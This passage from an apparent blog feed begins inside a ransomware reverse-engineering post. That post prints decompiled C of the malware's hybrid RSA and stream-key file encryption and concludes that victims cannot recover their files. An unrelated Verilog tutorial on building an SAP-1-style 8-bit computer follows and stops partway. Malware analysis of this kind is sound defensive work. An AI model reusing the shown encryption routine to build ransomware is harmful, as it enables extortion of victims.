<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
</span></span><span style="display:flex;"><span>local_3c <span style="color:#f92672">=</span> <span style="color:#a6e22e">open_read_write</span>(file_to_encrypt);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (local_3c <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">print_error</span>(<span style="color:#e6db74">&#34;open_read&#34;</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  local_74 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can see that it&rsquo;s opening a specific file to read and write. It&rsquo;s reading into <code>local_3c</code> so I&rsquo;ll rename that to <code>encrypt_file_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">gen_stream_key</span>(local_38,<span style="color:#ae81ff">0x20</span>);
</span></span></code></pre></div><p>Here, it&rsquo;s creating a symmetric key. As we can see, it&rsquo;s taking in an <code>0x20</code> as a parameter, and any multiple of 16 or 128 bits is a symmetric stream key. So this symmetric key will be used for symmetric encryption.</p>
<p>We see that <code>local_38</code> is being passed into the function, so that&rsquo;s probably going to be the symmetric key buffer. Let&rsquo;s rename it to <code>sym_key_buffer</code></p>
<p>Let&rsquo;s see what&rsquo;s in this <code>gen_stream_key()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">gen_stream_key</span>(undefined8 param_1,undefined4 param_2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>lRAND_pseudo_bytes)(param_1,param_2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">print_error_ex</span>(<span style="color:#e6db74">&#34;RAND_pseudo_bytes&#34;</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is generating a pseudo random symmetric key. So this symmetric key is secure. Had they used a static seed or a non-random value as a key, there would&rsquo;ve been a vulnerability in this malware and we would be able to exploit it.</p>
<p>Let&rsquo;s continue where we left off in the <code>encrypt_file()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">rsa_encrypt</span>(param_2,sym_key_buffer,<span style="color:#ae81ff">0x20</span>,<span style="color:#f92672">&amp;</span>local_48,<span style="color:#f92672">&amp;</span>local_40);
</span></span></code></pre></div><p>Here, it&rsquo;s calling the <code>rsa_encrypt()</code> function. Let&rsquo;s check out what this function does:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">rsa_encrypt</span>(undefined8 param_1,undefined8 param_2,<span style="color:#66d9ef">int</span> param_3,<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>param_4,<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>param_5)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pvVar2;
</span></span><span style="display:flex;"><span>  undefined4 local_44;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>lRSA_size)(param_1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (param_3 <span style="color:#f92672">&lt;</span> iVar1) {
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>lRSA_size)(param_1);
</span></span><span style="display:flex;"><span>    pvVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>((<span style="color:#66d9ef">long</span>)iVar1,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>param_4 <span style="color:#f92672">=</span> pvVar2;
</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#f92672">=</span> (<span style="color:#f92672">*</span>lRSA_public_encrypt)(param_3,param_2,<span style="color:#f92672">*</span>param_4,param_1,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">print_error_ex</span>(<span style="color:#e6db74">&#34;RSA_public_encrypt&#34;</span>,<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>      local_44 <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>param_5 <span style="color:#f92672">=</span> iVar1;
</span></span><span style="display:flex;"><span>      local_44 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;encrypt_bytes: too big data&#34;</span>);
</span></span><span style="display:flex;"><span>    local_44 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> local_44;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>So this function looks like it&rsquo;s encrypting the symmetric key using the RSA object that it generated before. We can see it in this line <code>iVar1 = (*lRSA_public_encrypt)(param_3,param_2,*param_4,param_1,1);</code>. <code>param_3</code> is <code>0x20</code> and <code>param_2</code> is the <code>sym_key_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">encrypt_simple</span>(encrypt_file_buffer,param_3,param_4,sym_key_buffer,<span style="color:#ae81ff">0x20</span>,param_5);
</span></span></code></pre></div><p>Next, we can see that this is encrypting <code>encrypt_file_buffer</code> using the <code>sym_key_buffer</code>. So in this function, without jumping into it, we can already guess that this will take the symmetric key and use it to encrypt the file.</p>
<p>Looking in this function, there&rsquo;s just a lot of math code for encrypting. So my previous assumption is correct.</p>
<p>The rest of the code after this is error handling and writing the encrypted file to the original file.</p>
<p>So when it comes to decrypting the files, we need to use a private key. We need to derive a stream key from the private key and use that to decrypt the files.</p>
<h1 id="the-conclusion">The conclusion</h1>
<p>Well that was a long blog post. I tried to go over every important details.</p>
<p>I found the crazy thing about it is the fact that all the debugging information is still there in the binary. After analyzing this, I found that there&rsquo;s not really much you can do if you&rsquo;re a victim of this ransomware. Because it uses asymmetric encryption combined with a pseudo-random stream key, it pretty much forces any victim of this ransomware to pay.</p>
<p>Even after analyzing this ransomware, there&rsquo;s not really any information that I extracted from this analysis that could help a victim of attack. So call me crazy but I guess the malware author left the debugging information in there as a &ldquo;flex&rdquo;, because they knew that their malware was cryptographically secure.</p>
]]></content>
        </item>
        
        <item>
            <title>8-bit Computer in FPGA</title>
            <link>https://namberino.github.io/posts/2024/02/8-bit-computer-in-fpga/</link>
            <pubDate>Mon, 26 Feb 2024 10:01:26 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/02/8-bit-computer-in-fpga/</guid>
            <description>&lt;p&gt;Computers are mysterious. These machines have always been so enigmatic to most people. I can guarantee that if you ask someone on the road how computers work, they would most likely just answer &amp;ldquo;&lt;em&gt;I don&amp;rsquo;t know&lt;/em&gt;&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;I was like that for a long time, even after I started learning programming. So I decided that I will learn how a computer works by building one.&lt;/p&gt;
&lt;p&gt;At first, I was thinking about building a breadboard computer like &lt;a href=&#34;https://www.youtube.com/playlist?list=PLowKtXNTBypGqImE405J2565dvjafglHU&#34;&gt;Ben Eater&lt;/a&gt;. But then I realized that I don&amp;rsquo;t really have access to a lot of the components that Ben used where I live so I decided to make this computer using software, and since I just started learning &lt;strong&gt;Verilog&lt;/strong&gt;, I decided to put my &lt;strong&gt;Verilog&lt;/strong&gt; skill to the test by making this computer.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Computers are mysterious. These machines have always been so enigmatic to most people. I can guarantee that if you ask someone on the road how computers work, they would most likely just answer &ldquo;<em>I don&rsquo;t know</em>&rdquo;.</p>
<p>I was like that for a long time, even after I started learning programming. So I decided that I will learn how a computer works by building one.</p>
<p>At first, I was thinking about building a breadboard computer like <a href="https://www.youtube.com/playlist?list=PLowKtXNTBypGqImE405J2565dvjafglHU">Ben Eater</a>. But then I realized that I don&rsquo;t really have access to a lot of the components that Ben used where I live so I decided to make this computer using software, and since I just started learning <strong>Verilog</strong>, I decided to put my <strong>Verilog</strong> skill to the test by making this computer.</p>
<hr>
<h2 id="the-toolchain">The toolchain</h2>
<p>For this project, I decided to use some open source toolchain for FPGA. When I was doing some research, I found <a href="https://github.com/FPGAwars/apio"><em>Apio</em></a>, which is an open source ecosystem of FPGA tools, so I decided to use <em>Apio</em> for this project.</p>
<p>Here&rsquo;s how you install Apio:</p>
<ul>
<li>Install <a href="https://www.python.org/downloads/">Python</a></li>
<li>Install Apio with <code>pip</code> (if the <code>pip</code> command is not available, run <code>easy_install pip</code>)</li>
</ul>
<pre tabindex="0"><code>$ pip install -U apio
</code></pre><ul>
<li>Install necessary packages:</li>
</ul>
<pre tabindex="0"><code>$ apio install -a
</code></pre><p>Now you can use Apio for your project. Check out Apio&rsquo;s <a href="https://apiodoc.readthedocs.io/en/stable/source/quick_start.html">quick start</a> page to learn how to use it.</p>
<hr>
<h2 id="the-architecture">The architecture</h2>
<p>I based this computer&rsquo;s architecture on the <em>SAP-1</em> in <a href="https://www.amazon.com/Digital-Computer-Electronics-Jerald-Malvino-dp-0074622358/dp/0074622358/ref=dp_ob_image_bk">Digital Computer Electronics</a>.</p>
<p><img src="/img/8bit-computer/8bit-architecture.png" alt="8bit architecture pic"></p>
<p>The modules share some common signal path: <em>clk</em>, <em>rst</em> and <em>out</em>.</p>
<ul>
<li><em>clk</em>: The clock signal</li>
<li><em>rst</em>: The reset signal (resets everything back to 0)</li>
<li><em>out</em>: The output of each modules (connected to the bus for communication between modules)</li>
</ul>
<p>I combined the <em>MAR</em> module from the original <em>SAP-1</em> architecture with the <em>RAM</em> module to make the memory module. Some signals may also have different names as I&rsquo;m basing the architecture of this computer off of my memory of the <em>SAP-1</em> architecture.</p>
<p>This won&rsquo;t be an exact copy of the <em>SAP-1</em> but it&rsquo;s close enough and it&rsquo;s still a functioning 8-bit computer.</p>
<p>So let&rsquo;s get to making this computer.</p>
<hr>
<h2 id="the-components">The components</h2>
<p>Let&rsquo;s see how each components of the computer works:</p>
<ol>
<li><em>The bus</em>: This is where all the data is sent through. It is 8-bit wide and it is how components communicate with and send data to each other. The bus have <em>enable</em> signals that will allow it to multiplex between the different outputs of the modules.</li>
<li><em>The clock</em>: This module synchronizes all the components. Think of it like a conductor leading an orchestra. This component will output the <em>clk_in</em> signal if <em>hlt</em> is low, and output 0 if <em>hlt</em> is high. The <em>hlt</em> signal is used to implement the <strong>HLT</strong> instruction later on.</li>
<li><em>The program counter</em>: This module holds the next instruction to be executed. This module counts from <code>0x0</code> to <code>0xF</code> as there&rsquo;s only 16 bytes of memory in this computer. The <em>inc</em> signal tells this module to increment the value in itself by 1.</li>
<li><em>The instruction register</em>: This module loads the instruction from memory and seperates the opcode and the data. The upper 4 bits of the instruction is the opcode and the lower 4 bits is the address of the data. For the instructions that don&rsquo;t require data (like <strong>HLT</strong>), the lower 4 bits will be ignored.</li>
<li><em>The accumulator (A register)</em>: This is the main register of the computer. This stores the intermediate data during an execution. This needs a <em>load</em> signal to load values into it from the bus.</li>
<li><em>The B register</em>: This a buffer register used to perform arithmetic operations. It&rsquo;s basically a supporting register for the A register. It holds the number to be added to or subtracted from the A register. It also accepts a <em>load</em> signal to load values into it from the bus.</li>
<li><em>The adder</em>: This module is responsible for doing all the math in this computer. It can add (A + B) or subtract (A - B). It doesn&rsquo;t use the clock signal as it is constantly calculating and outputing the result based on the A and B values.</li>
<li><em>The memory</em>: There&rsquo;s 16 bytes of memory in this computer. The memory has a 4-bit register called the <em>Memory Address Register</em> or <em>MAR</em> for short, which temporarily holds a memory address of data or instruction in memory. This stored address is sent to the <em>RAM</em> where data and instructions are read from. It takes the computer 2 cycles to read from memory: 1st cycle will load an address from the bus into the <em>MAR</em>, 2nd cycle will use the value in the <em>MAR</em> to address into the <em>RAM</em> and output the value. This computer will initialize the memory by loading from a file called <em>program.bin</em></li>
<li><em>The controller</em>: This is the most complicated part about the computer. It will decide what the computer will do next by asserting different control signals in a 12-bit control word at different execution stages. We&rsquo;ll talk about the different control signals and execution stages later on.</li>
</ol>
<h2 id="the-execution-stages">The execution stages</h2>
<p>Instruction execution occurs in a series of <em>stages</em> (each stage takes 1 clock cycle). This computer has <strong>6</strong> stages (0 to 5). It counts up to 5 then goes back to 0 then continue (counts using a 3-bit register)</p>
<p>Opcode is passed from the <em>instruction register</em> into the <em>controller</em> to do things based on what instruction is. Output of the <em>controller</em> is the 12 control signals used to control all the other modules. Different stages of different instructions will assert different signals to accomplish different things.</p>
<p>Control signals:</p>
<ul>
<li><em>hlt</em>: halt execution</li>
<li><em>pc_inc</em>: increment program counter</li>
<li><em>pc_en</em>: put value of the pc onto the bus</li>
<li><em>mar_load</em>: load address into memory address register</li>
<li><em>mem_en</em>: put value from memory into the bus</li>
<li><em>ir_load</em>: load value from bus into intruction register</li>
<li><em>ir_en</em>: put value in ir onto the bus</li>
<li><em>a_load</em>: load value from bus into A register</li>
<li><em>a_en</em>: put value in A onto the bus</li>
<li><em>b_load</em>: load value from bus into B register</li>
<li><em>adder_sub</em>: subtract value in B from A</li>
<li><em>adder_en</em>: put value in adder onto the bus</li>
</ul>
<h2 id="the-instructions">The instructions</h2>
<p>This computer has 4 instructions:</p>
<table>
  <thead>
      <tr>
          <th style="text-align: center">Opcode</th>
          <th>Instruction</th>
          <th>Description</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: center"><em>0000</em></td>
          <td><strong>LDA $x</strong></td>
          <td>Load value at memory location <em>$x</em> into A</td>
      </tr>
      <tr>
          <td style="text-align: center"><em>0001</em></td>
          <td><strong>ADD $x</strong></td>
          <td>Add value at memory location <em>$x</em> with value in A and store the sum in A</td>
      </tr>
      <tr>
          <td style="text-align: center"><em>0010</em></td>
          <td><strong>SUB $x</strong></td>
          <td>Subtract value at memory location <em>$x</em> from value in A and store the difference in A</td>
      </tr>
      <tr>
          <td style="text-align: center"><em>1111</em></td>
          <td><strong>HLT</strong></td>
          <td>Halt program execution</td>
      </tr>
  </tbody>
</table>
<p>Every instruction has the same first 3 stages:</p>
<ul>
<li><strong>Stage 0</strong>: Put the <em>PC</em> onto bus and load that value into <em>MAR</em> (<em>pc_en</em> -&gt; <em>mar_load</em>)</li>
<li><strong>Stage 1</strong>: Increment <em>PC</em> (<em>pc_inc</em>)</li>
<li><strong>Stage 2</strong>: Put value in memory at the <em>MAR</em> address onto the bus and load that into the <em>IR</em> (<em>mem_en</em> -&gt; <em>ir_load</em>)</li>
</ul>
<p>Next 3 stages differs from instruction to instruction:</p>
<table>
  <thead>
      <tr>
          <th>Stage</th>
          <th>LDA</th>
          <th>ADD</th>
          <th>SUB</th>
          <th>HLT</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>Stage 3</strong></td>
          <td>Put instruction operand onto the bus and load that value into MAR (<em>ir_en</em> -&gt; <em>mar_load</em>)</td>
          <td>Put instruction operand onto the bus and load that value into MAR (<em>ir_en</em> -&gt; <em>mar_load</em>)</td>
          <td>Put instruction operand onto the bus and load that value into MAR (<em>ir_en</em> -&gt; <em>mar_load</em>)</td>
          <td>Halt the clock (<em>hlt</em>)</td>
      </tr>
      <tr>
          <td><strong>Stage 4</strong></td>
          <td>Put value in memory at the MAR address onto the bus and load that into the A register (<em>mem_en</em> -&gt; <em>a_load</em>)</td>
          <td>Put value in memory at the MAR address onto the bus and load that into the B register (<em>mem_en</em> -&gt; <em>b_load</em>)</td>
          <td>Put value in memory at the MAR address onto the bus and load that into the B register (<em>mem_en</em> -&gt; <em>b_load</em>)</td>
          <td>Idle</td>
      </tr>
      <tr>
          <td><strong>Stage 5</strong></td>
          <td>Idle</td>
          <td>Put value in the adder onto the bus and load that into the A register (<em>adder_en</em> -&gt; <em>a_load</em>)</td>
          <td>Subtract then put the value in the adder onto the bus and load that into the A register (<em>adder_sub</em> -&gt; <em>adder_en</em> -&gt; <em>a_load</em>)</td>
          <td>Idle</td>
      </tr>
  </tbody>
</table>
<h2 id="the-verilog-modules">The Verilog modules</h2>
<p>These modules will be programmed in <em>Verilog</em>. There will be a top module that will be used to connect all of these components together. There will also be a top module testbench to test out the design and check if the computer is working or not.</p>
<h3 id="the-clock">The clock</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#66d9ef">module</span> clock(
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> hlt, <span style="color:#75715e">// halt signal
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">input</span> clk_in,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">output</span> clk_out
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">assign</span> clk_out <span style="color:#f92672">=</span> hlt <span style="color:#f92672">?</span> <span style="color:#ae81ff">1</span><span style="color:#ae81ff">&#39;b0</span> <span style="color:#f92672">:</span> clk_in;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endmodule</span>
</span></span></code></pre></div><h3 id="the-program-counter">The program counter</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#66d9ef">module</span> pc(
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> clk,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> rst,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> inc,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">output</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] out
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">reg</span>[<span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] pc;
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">always</span> @ (<span style="color:#66d9ef">posedge</span> clk, <span style="color:#66d9ef">posedge</span> rst)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (rst)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			pc <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">4</span><span style="color:#ae81ff">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (inc)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			pc <span style="color:#f92672">&lt;=</span> pc <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">assign</span> out <span style="color:#f92672">=</span> pc;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endmodule</span>
</span></span></code></pre></div><h3 id="the-instruction-register">The instruction register</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#66d9ef">module</span> ir(
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> clk, 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> rst,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> load,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] bus,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">output</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] out
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">reg</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] ir;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">always</span> @ (<span style="color:#66d9ef">posedge</span> clk, <span style="color:#66d9ef">posedge</span> rst)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (rst)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			ir <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">8</span><span style="color:#ae81ff">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (load)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			ir <span style="color:#f92672">&lt;=</span> bus;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">assign</span> out <span style="color:#f92672">=</span> ir;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endmodule</span>
</span></span></code></pre></div><h3 id="the-accumulator-a-register">The accumulator (A register)</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#66d9ef">module</span> reg_a(
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> clk,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> rst,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> load,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] bus,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">output</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] out
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">reg</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] reg_a;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">always</span> @ (<span style="color:#66d9ef">posedge</span> clk, <span style="color:#66d9ef">posedge</span> rst)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (rst)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			reg_a <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">8</span><span style="color:#ae81ff">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (load)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			reg_a <span style="color:#f92672">&lt;=</span> bus;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">assign</span> out <span style="color:#f92672">=</span> reg_a;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endmodule</span>
</span></span></code></pre></div><h3 id="the-b-register">The B register</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-verilog" data-lang="verilog"><span style="display:flex;"><span><span style="color:#66d9ef">module</span> reg_b(
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> clk,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> rst,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span> load,
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">input</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] bus,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">output</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] out
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">reg</span>[<span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>] reg_b;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">always</span> @ (<span style="color:#66d9ef">posedge</span> clk, <span style="color:#66d9ef">posedge</span> rst)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (rst)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			reg_b <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">8</span><span style="color:#ae81ff">&#39;b0</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span> <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (load)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">begin</span>
</span></span><span style="display:flex;"><span>			reg_b <span style="color:#f92672">&lt;=</span> bus;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">end</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">assign</span> out <span style="color:#f92672">=</span> reg_b;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">endmodule</span>
</span></span></code></pre></div><h3 id="the-adder">The adder</h3>
